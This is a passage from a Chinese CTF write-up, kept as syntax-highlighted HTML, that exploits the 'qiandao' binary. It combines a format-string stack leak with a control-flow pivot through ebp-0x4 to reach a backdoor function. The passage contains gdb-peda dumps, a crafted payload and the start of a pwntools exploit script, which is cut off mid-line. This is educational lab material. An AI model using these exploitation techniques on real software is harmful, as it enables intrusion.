operator">:</span>    xchg   ax<span class="token punctuation">,</span>ax<span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0xffffd04c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xf7df5e81</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main<span class="token operator">+</span><span class="token number">241</span><span class="token operator">></span><span class="token operator">:</span>    add    esp<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token number">0004</span><span class="token operator">|</span> <span class="token number">0xffffd050</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb2000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1d4d6c</span> <span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0xffffd054</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb2000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1d4d6c</span> <span class="token number">0012</span><span class="token operator">|</span> <span class="token number">0xffffd058</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0xffffd05c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xf7df5e81</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main<span class="token operator">+</span><span class="token number">241</span><span class="token operator">></span><span class="token operator">:</span>    add    esp<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token number">0020</span><span class="token operator">|</span> <span class="token number">0xffffd060</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1</span> <span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0xffffd064</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xffffd0f4</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xffffd2c2</span> <span class="token punctuation">(</span><span class="token string">"/home/hunter/PWN/DASCTF/qiandao"</span><span class="token punctuation">)</span><span class="token number">0028</span><span class="token operator">|</span> <span class="token number">0xffffd068</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xffffd0fc</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xffffd2e2</span> <span class="token punctuation">(</span><span class="token string">"XDG_VTNR=7"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> value<span class="token number">0x08048601</span> in <span class="token function">main</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token operator">-</span>peda$ </code></pre><ul><li>0x80485fd &lt;main+104&gt;:    mov    ecx,DWORD PTR [ebp-0x4] 将ebp-0x4处的数据值赋给了ecx</li><li>0x8048601 &lt;main+108&gt;:    lea    esp,[ecx-0x4]    将exc-0x4赋给esp</li><li>ret                                           pop ip 转跳<br>因为这里不是常规的leave ret结尾，常规栈溢出肯定无法实现。</li></ul><p><strong>通过上面三条关键语句的梳理可知：ebp-0x4里面的数据 赋给ecx。然后esp指向ecx-0x4处的地址，最后ret到那个地址。</strong><br><strong>所以控制ebp-0x4处的非常关键，决定了程序流程。</strong></p><h3 id="小错误"><a href="#小错误" class="headerlink" title="小错误"></a>小错误</h3><p>当时我也注意到了这个问题，然后就构造payload把ebp-0x4处的地址覆盖为：p32（backdoor）+0x4.这样0x8048601 &lt;main+108&gt;:    lea    esp,[ecx-0x4] 语句后 esp指向p32（backdoor）了，然后ret一下就成功了。</p><pre class=" language-java"><code class="language-java">ECX<span class="token operator">:</span> <span class="token function">0x8048581</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>backdoor<span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span><span class="token operator">:</span>    in     al<span class="token punctuation">,</span>dx<span class="token punctuation">)</span>EDX<span class="token operator">:</span> <span class="token number">0xf7fa189c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> ESI<span class="token operator">:</span> <span class="token number">0xf7fa0000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1d4d6c</span> EDI<span class="token operator">:</span> <span class="token number">0x0</span> EBP<span class="token operator">:</span> <span class="token number">0x0</span> ESP<span class="token operator">:</span> <span class="token function">0x804857d</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>backdoor<span class="token operator">></span><span class="token operator">:</span>    push   ebp<span class="token punctuation">)</span>EIP<span class="token operator">:</span> <span class="token function">0x8048604</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">111</span><span class="token operator">></span><span class="token operator">:</span>    ret<span class="token punctuation">)</span>EFLAGS<span class="token operator">:</span> <span class="token function">0x282</span> <span class="token punctuation">(</span>carry parity adjust zero SIGN trap INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>code<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span>   <span class="token number">0x80485fd</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">104</span><span class="token operator">></span><span class="token operator">:</span>    mov    ecx<span class="token punctuation">,</span>DWORD PTR <span class="token punctuation">[</span>ebp<span class="token operator">-</span><span class="token number">0x4</span><span class="token punctuation">]</span>   <span class="token number">0x8048600</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">107</span><span class="token operator">></span><span class="token operator">:</span>    leave     <span class="token number">0x8048601</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">108</span><span class="token operator">></span><span class="token operator">:</span>    lea    esp<span class="token punctuation">,</span><span class="token punctuation">[</span>ecx<span class="token operator">-</span><span class="token number">0x4</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x8048604</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">111</span><span class="token operator">></span><span class="token operator">:</span>    ret       <span class="token number">0x8048605</span><span class="token operator">:</span>    xchg   ax<span class="token punctuation">,</span>ax   <span class="token number">0x8048607</span><span class="token operator">:</span>    xchg   ax<span class="token punctuation">,</span>ax   <span class="token number">0x8048609</span><span class="token operator">:</span>    xchg   ax<span class="token punctuation">,</span>ax   <span class="token number">0x804860b</span><span class="token operator">:</span>    xchg   ax<span class="token punctuation">,</span>ax<span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token function">0x804857d</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>backdoor<span class="token operator">></span><span class="token operator">:</span>    push   ebp<span class="token punctuation">)</span><span class="token number">0004</span><span class="token operator">|</span> <span class="token function">0x8048581</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>backdoor<span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span><span class="token operator">:</span>    in     al<span class="token punctuation">,</span>dx<span class="token punctuation">)</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token function">0x8048585</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>backdoor<span class="token operator">+</span><span class="token number">8</span><span class="token operator">></span><span class="token operator">:</span>    or     al<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">)</span><span class="token number">0012</span><span class="token operator">|</span> <span class="token function">0x8048589</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>backdoor<span class="token operator">+</span><span class="token number">12</span><span class="token operator">></span><span class="token operator">:</span>    add    al<span class="token punctuation">,</span><span class="token number">0x8</span><span class="token punctuation">)</span><span class="token number">0016</span><span class="token operator">|</span> <span class="token function">0x804858d</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>backdoor<span class="token operator">+</span><span class="token number">16</span><span class="token operator">></span><span class="token operator">:</span>    <span class="token punctuation">(</span>bad<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">0020</span><span class="token operator">|</span> <span class="token function">0x8048591</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>backdoor<span class="token operator">+</span><span class="token number">20</span><span class="token operator">></span><span class="token operator">:</span>    les    edx<span class="token punctuation">,</span>FWORD PTR <span class="token punctuation">[</span>eax<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token number">0024</span><span class="token operator">|</span> <span class="token function">0x8048595</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">></span><span class="token operator">:</span>    lea    ecx<span class="token punctuation">,</span><span class="token punctuation">[</span>esp<span class="token operator">+</span><span class="token number">0x4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token number">0028</span><span class="token operator">|</span> <span class="token function">0x8048599</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">4</span><span class="token operator">></span><span class="token operator">:</span>    and    esp<span class="token punctuation">,</span><span class="token number">0xfffffff0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> value<span class="token number">0x08048604</span> in <span class="token function">main</span> <span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>看，esp确实指向了backdoor。说明我都想法还是挺不错的，但是事实很残酷，在执行lea    esp,[ecx-0x4]后esp就指向了backdoor（0x804857d )，相当于将backdoor以下都是为栈中数据，由于NX保护无法执行。可以看到那些指令都被拆分了，没有成型的system语句。</p><p><strong>因此我们要做的就是在ret时仅仅把backdoor首地址 pop到ip中 而不是让esp直接指向backdoor</strong></p><h3 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h3><p>将backdoor地址放入某个栈中，调节ecx，使得esp可以左后指向这个栈地址，然后ret 将该栈中地址pop入ip。这样esp将会指向下一个栈帧，同时ip存入了backdoor地址</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ul><li>利用fmt漏洞泄露栈地址</li><li>根据相对位移调节ebp-0x4地址里，应该放入的值</li></ul><h3 id="泄露栈地址"><a href="#泄露栈地址" class="headerlink" title="泄露栈地址"></a>泄露栈地址</h3><p>泄露栈地址最好先用gdb搞清楚栈分布，在printf处下断点</p><pre class=" language-java"><code class="language-java">EBP<span class="token operator">:</span> <span class="token number">0xffffd048</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> ESP<span class="token operator">:</span> <span class="token number">0xffffd010</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xffffd030</span> <span class="token punctuation">(</span><span class="token string">"AAAA.%1$p.%2$p.%5$p.%8$p"</span><span class="token punctuation">)</span>EIP<span class="token operator">:</span> <span class="token function">0x80485d1</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">60</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x80483e0</span> <span class="token operator">&lt;</span>printf<span class="token annotation punctuation">@plt</span><span class="token operator">></span><span class="token punctuation">)</span>EFLAGS<span class="token operator">:</span> <span class="token function">0x296</span> <span class="token punctuation">(</span>carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>code<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span>   <span class="token number">0x80485ca</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">53</span><span class="token operator">></span><span class="token operator">:</span>    sub    esp<span class="token punctuation">,</span><span class="token number">0xc</span>   <span class="token number">0x80485cd</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">56</span><span class="token operator">></span><span class="token operator">:</span>    lea    eax<span class="token punctuation">,</span><span class="token punctuation">[</span>ebp<span class="token operator">-</span><span class="token number">0x18</span><span class="token punctuation">]</span>   <span class="token number">0x80485d0</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">59</span><span class="token operator">></span><span class="token operator">:</span>    push   eax<span class="token operator">=</span><span class="token operator">></span> <span class="token number">0x80485d1</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">60</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x80483e0</span> <span class="token operator">&lt;</span>printf<span class="token annotation punctuation">@plt</span><span class="token operator">></span>   <span class="token number">0x80485d6</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">65</span><span class="token operator">></span><span class="token operator">:</span>    add    esp<span class="token punctuation">,</span><span class="token number">0x10</span>   <span class="token number">0x80485d9</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">68</span><span class="token operator">></span><span class="token operator">:</span>    sub    esp<span class="token punctuation">,</span><span class="token number">0xc</span>   <span class="token number">0x80485dc</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">71</span><span class="token operator">></span><span class="token operator">:</span>    push   <span class="token number">0x80486ac</span>   <span class="token number">0x80485e1</span> <span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">76</span><span class="token operator">></span><span class="token operator">:</span>    call   <span class="token number">0x8048400</span> <span class="token operator">&lt;</span>puts<span class="token annotation punctuation">@plt</span><span class="token operator">></span>Guessed arguments<span class="token operator">:</span>arg<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token function">0xffffd030</span> <span class="token punctuation">(</span><span class="token string">"AAAA.%1$p.%2$p.%5$p.%8$p"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span>stack<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token punctuation">]</span><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0xffffd010</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xffffd030</span> <span class="token punctuation">(</span><span class="token string">"AAAA.%1$p.%2$p.%5$p.%8$p"</span><span class="token punctuation">)</span><span class="token number">0004</span><span class="token operator">|</span> <span class="token number">0xffffd014</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb2000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1d4d6c</span> <span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0xffffd018</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xffffd048</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0012</span><span class="token operator">|</span> <span class="token number">0xffffd01c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x80485ab</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">22</span><span class="token operator">></span><span class="token operator">:</span>    sub    esp<span class="token punctuation">,</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0xffffd020</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb23fc</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb3200</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0020</span><span class="token operator">|</span> <span class="token number">0xffffd024</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0xffffd028</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0028</span><span class="token operator">|</span> <span class="token number">0xffffd02c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x804865b</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">75</span><span class="token operator">></span><span class="token operator">:</span>    add    edi<span class="token punctuation">,</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token punctuation">]</span>Legend<span class="token operator">:</span> code<span class="token punctuation">,</span> data<span class="token punctuation">,</span> rodata<span class="token punctuation">,</span> valueBreakpoint <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x080485d1</span> in <span class="token function">main</span> <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb<span class="token operator">-</span>peda$ niAAAA<span class="token punctuation">.</span><span class="token number">0xf7fb2000</span><span class="token punctuation">.</span><span class="token number">0xffffd048</span><span class="token punctuation">.</span><span class="token punctuation">(</span>nil<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token number">0x41414141</span></code></pre><p>我的输入为AAAA.%1$p.%2$p.%5$p.%8$p，执行printf函数后结果为：<strong>AAAA.0xf7fb2000.0xffffd048.(nil).0x41414141</strong><br>此时栈情况：</p><pre class=" language-java"><code class="language-java"><span class="token number">0000</span><span class="token operator">|</span> <span class="token number">0xffffd010</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xffffd030</span> <span class="token punctuation">(</span><span class="token string">"AAAA.%1$p.%2$p.%5$p.%8$p"</span><span class="token punctuation">)</span>   <span class="token number">0004</span><span class="token operator">|</span> <span class="token number">0xffffd014</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb2000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1d4d6c</span>        off<span class="token operator">=</span><span class="token number">1</span><span class="token number">0008</span><span class="token operator">|</span> <span class="token number">0xffffd018</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xffffd048</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span>             off<span class="token operator">=</span><span class="token number">2</span><span class="token number">0012</span><span class="token operator">|</span> <span class="token number">0xffffd01c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x80485ab</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">+</span><span class="token number">22</span><span class="token operator">></span><span class="token operator">:</span>    sub    esp<span class="token punctuation">,</span><span class="token number">0xc</span><span class="token punctuation">)</span><span class="token number">0016</span><span class="token operator">|</span> <span class="token number">0xffffd020</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb23fc</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb3200</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0020</span><span class="token operator">|</span> <span class="token number">0xffffd024</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0024</span><span class="token operator">|</span> <span class="token number">0xffffd028</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0028</span><span class="token operator">|</span> <span class="token number">0xffffd02c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0x804865b</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_csu_init<span class="token operator">+</span><span class="token number">75</span><span class="token operator">></span><span class="token operator">:</span>    add    edi<span class="token punctuation">,</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token number">0032</span><span class="token operator">|</span> <span class="token function">0xffffd030</span> <span class="token punctuation">(</span><span class="token string">"AAAA.%1$p.%2$p.%5$p.%8$p"</span><span class="token punctuation">)</span>      off<span class="token operator">=</span><span class="token number">8</span><span class="token number">0036</span><span class="token operator">|</span> <span class="token function">0xffffd034</span> <span class="token punctuation">(</span><span class="token string">".%1$p.%2$p.%5$p.%8$p"</span><span class="token punctuation">)</span><span class="token number">0040</span><span class="token operator">|</span> <span class="token function">0xffffd038</span> <span class="token punctuation">(</span><span class="token string">"p.%2$p.%5$p.%8$p"</span><span class="token punctuation">)</span><span class="token number">0044</span><span class="token operator">|</span> <span class="token function">0xffffd03c</span> <span class="token punctuation">(</span><span class="token string">"$p.%5$p.%8$p"</span><span class="token punctuation">)</span><span class="token number">0048</span><span class="token operator">|</span> <span class="token function">0xffffd040</span> <span class="token punctuation">(</span><span class="token string">"5$p.%8$p"</span><span class="token punctuation">)</span><span class="token number">0052</span><span class="token operator">|</span> <span class="token function">0xffffd044</span> <span class="token punctuation">(</span><span class="token string">"%8$p"</span><span class="token punctuation">)</span><span class="token number">0056</span><span class="token operator">|</span> <span class="token number">0xffffd048</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0060</span><span class="token operator">|</span> <span class="token number">0xffffd04c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xf7df5e81</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main<span class="token operator">+</span><span class="token number">241</span><span class="token operator">></span><span class="token operator">:</span>    add    esp<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token number">0064</span><span class="token operator">|</span> <span class="token number">0xffffd050</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb2000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1d4d6c</span> <span class="token number">0068</span><span class="token operator">|</span> <span class="token number">0xffffd054</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0xf7fb2000</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x1d4d6c</span> <span class="token number">0072</span><span class="token operator">|</span> <span class="token number">0xffffd058</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token number">0x0</span> <span class="token number">0076</span><span class="token operator">|</span> <span class="token number">0xffffd05c</span> <span class="token operator">--</span><span class="token operator">></span> <span class="token function">0xf7df5e81</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span>__libc_start_main<span class="token operator">+</span><span class="token number">241</span><span class="token operator">></span><span class="token operator">:</span>    add    esp<span class="token punctuation">,</span><span class="token number">0x10</span><span class="token punctuation">)</span></code></pre><p>二者结合可以明显看出fmt漏洞规律。所以以后需要泄露栈地址，用fmt加gdb调试，泄露函数就用常规的偏移量。显然此处8是偏移量<br>我们在偏移为2的地方可以泄露ebp地址。</p><p><strong>所以我们用第一个gets函数来泄露地址，那么用第二个gets函数来控制流程</strong></p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>得到ebp地址，可以求出gets(&amp;v4)中v4的地址（char v4; // [esp+0h] [ebp-28h])，然后我们直接在v4首地址放入p32（backdoor）在ebp-0x4地址处放入&amp;v4+0x4</p><pre class=" language-python"><code class="language-python">payload <span class="token operator">=</span> p32（backdoor）payload <span class="token operator">+=</span> ’A'<span class="token operator">*</span><span class="token number">0x20</span>payload <span class="token operator">+=</span> p32（ebp<span class="token number">-0x28</span><span class="token operator">+</span><span class="token number">0x4</span>）</code></pre><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'qiandao'</span><span class="token punctuation">)</span>backdoor <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'backdoor'</span><span class="token punctuation">]</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./qiandao'</span><span class="token punctuation">)</span><span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">'%2$pAAA'</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>ebp_addr <span class="token operator">=</span> int<span class="token 